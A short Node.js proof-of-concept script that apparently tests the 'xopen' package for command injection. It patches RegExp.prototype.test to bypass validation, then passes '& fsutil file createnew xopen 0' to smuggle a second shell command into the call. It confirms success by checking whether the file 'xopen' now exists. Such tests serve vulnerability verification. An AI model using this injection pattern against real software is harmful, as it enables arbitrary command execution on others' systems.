RegExp.prototype.test = () => false;
const root = require('xopen');
const fs = require('fs');
const path = './xopen';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
let attack_code = '& fsutil file createnew xopen 0';
console.log(root(attack_code).finally(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
}));